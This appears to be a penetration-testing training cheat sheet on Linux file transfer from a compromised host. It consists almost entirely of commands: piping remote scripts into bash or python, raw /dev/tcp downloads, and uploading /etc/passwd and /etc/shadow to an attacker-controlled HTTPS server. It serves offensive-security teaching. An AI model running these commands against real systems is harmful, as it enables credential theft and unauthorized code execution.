## Linux File Transfer Methods

## Base64 Encoding / Decoding

#### Check File MD5 hash

```shell-session
$ md5sum file_to_transfer
```


#### Attacker machine - Encode SSH Key to Base64

```shell-session
$ cat file_to_transfer |base64 -w 0;echo
```


#### Target - Decode the File

```shell-session
$ echo -n '<snippet>' | base64 -d > file_to_transfer
```

#### Target - Confirm the MD5 Hashes Match

```shell-session
$ md5sum file_to_transfer
```

**Note:** You can also upload files using the reverse operation. From your compromised target cat and base64 encode a file and decode it in your Pwnbox.

## Web Downloads with Wget and cURL

#### Download a File Using wget

```shell-session
$ wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
```

#### Download a File Using cURL

```shell-session
$ curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
```

* * *

## Fileless Attacks Using Linux

#### Fileless Download with cURL

```shell-session
$ curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
```

#### Fileless Download with wget

```shell-session
$ wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3

Hello World!
```

* * *

## Download with Bash (/dev/tcp)

#### Connect to the Target Webserver

```shell-session
$ exec 3<>/dev/tcp/10.10.10.32/80
```

#### HTTP GET Request

```shell-session
$ echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
```

#### Print the Response

```shell-session
$ cat <&3
```

* * *

## SSH Downloads

#### Enabling the SSH Server

```shell-session
$ sudo systemctl enable ssh
```

#### Starting the SSH Server

```shell-session
$ sudo systemctl start ssh
```

#### Checking for SSH Listening Port

```shell-session
$ netstat -lnpt
```

#### Target - Downloading Files Using SCP

```shell-session
$ scp plaintext@192.168.49.128:/root/myroot.txt .
```

**Note:** You can create a temporary user account for file transfers and avoid using your primary credentials or keys on a remote computer.

* * *

## Upload Operations


## Web Upload

#### Attacker - Start Web Server

```shell-session
$ sudo python3 -m pip install --user uploadserver
```


#### Attacker - Create a Self-Signed Certificate

```shell-session
$ openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
```


#### Attacker - Start Web Server

```shell-session
$ mkdir https && cd https
```

```shell-session
$ sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
```

Now from our compromised machine, let's upload the `/etc/passwd` and `/etc/shadow` files.

#### Target - Upload Multiple Files

```shell-session
$ curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
```

We used the option `--insecure` because we used a self-signed certificate that we trust.

* * *

## Alternative Web File Transfer Method

#### Target - Creating a Web Server with Python3

```shell-session
$ python3 -m http.server
```

#### Target - Creating a Web Server with Python2.7

```shell-session
$ python2.7 -m SimpleHTTPServer
```

#### Target - Creating a Web Server with PHP

```shell-session
$ php -S 0.0.0.0:8000
```

#### Target - Creating a Web Server with Ruby

```shell-session
$ ruby -run -ehttpd . -p8000
```

#### Download the File from the Target Machine onto the Attacker

```shell-session
$ wget 192.168.49.128:8000/filetotransfer.txt
```

**Note:** When we start a new web server using Python or PHP, it's important to consider that inbound traffic may be blocked. We are transferring a file from our target onto our attack host, but we are not uploading the file.

* * *

## SCP Upload

#### File Upload using SCP

```shell-session
$ scp /etc/passwd username@10.129.86.90:/home/username/
```

**Note:** Remember that scp syntax is similar to cp or copy.

* * *